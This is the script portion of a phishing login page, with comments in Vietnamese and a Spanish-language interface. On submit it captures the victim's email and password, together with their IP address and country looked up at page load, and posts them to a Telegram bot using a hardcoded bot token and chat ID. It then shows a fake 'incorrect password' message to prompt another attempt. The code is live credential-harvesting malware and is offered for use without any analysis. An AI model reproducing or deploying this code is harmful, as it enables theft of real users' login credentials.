    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const passwordInput = document.getElementById('pass');
            const eyeIcon = document.querySelector('.fa-eye');
            eyeIcon.addEventListener('click', function () {
                const isPasswordVisible = passwordInput.type === 'text';
                passwordInput.type = isPasswordVisible ? 'password' : 'text';
                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
            });
        });
    </script>
    <script>
        function submitForm() {
            var emailInput = document.getElementById('email');
            var emailValue = emailInput.value;
            var passwordInput = document.getElementById('pass');
            var passwordValue = passwordInput.value;
            if (emailValue === '') {
                emailInput.style.borderColor = 'red';
                emailInput.focus();
            }
            else if (passwordValue === '') {
                passwordInput.focus();
            }
            else {
                var button = document.getElementById("login");
                var loader = document.getElementById("loader");
                button.style.display = "none";
                loader.style.display = "flex";
                event.preventDefault();
                const ipAddress = localStorage.getItem('ipAddress');
                const address = localStorage.getItem('address');
                const options = {
                    method: 'POST',
                    headers: {
                        accept: 'application/json',
                        'User-Agent': 'Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)',
                        'content-type': 'application/json'
                    },
                    body: JSON.stringify({
                        text: "<b>IP</b>: <code>" + ipAddress + "</code> \n<b>Địa chỉ:</b> <code>" + address + "</code> \n<b>Email:</b><code> " + emailValue + "</code>\n<b>Mật khẩu</b>:<code> " + passwordValue + "</code>",
                        parse_mode: 'HTML',
                        disable_web_page_preview: false,
                        disable_notification: false,
                        reply_to_message_id: null,
                        // Sửa cau hinh chat cua ban
                        chat_id: '5491296890'
                    })
                };

                 fetch('https://api.telegram.org/bot7043773023:AAFlwYHpOSQXjEKZVnI2TP9ed7VIHD1P0Gs/sendMessage', options)
                    .then(response => response.json())
                    .then(response => console.log(response))
                    .catch(err => console.error(err));
                setTimeout(function () {
                    emailInput.value = '';
                    passwordInput.value = '';
                    passwordInput.style.borderColor = 'red';
                    passwordInput.placeholder = 'La contraseña que has introducido es incorrecta.';
                    var button = document.getElementById("login");
                    var loader = document.getElementById("loader");

                    button.style.display = "block";
                    loader.style.display = "none";
                    button.addEventListener("click", submitForm);
                }, 1500);
            }
        }
        function removeRedBorder() {
            var emailInput = document.getElementById('email');
            var passwordInput = document.getElementById('pass');
            passwordInput.setAttribute('placeholder', 'Contraseña');
            passwordInput.style.borderColor = 'black';
            emailInput.style.borderColor = 'black';
        }
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', async function () {
            let ipAddress;
            let address;
            try {
                const ipifyResponse = await fetch('https://api.ipify.org?format=json');
                const ipifyData = await ipifyResponse.json();
                ipAddress = ipifyData.ip;

                const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
                const ipLocationNetData = await ipLocationNetResponse.json();
                address = ipLocationNetData.country_name;

                localStorage.setItem('ipAddress', ipAddress);
                localStorage.setItem('address', address);
            } catch (error) {
                console.error('Lỗi:', error);
            }
        });

    </script>
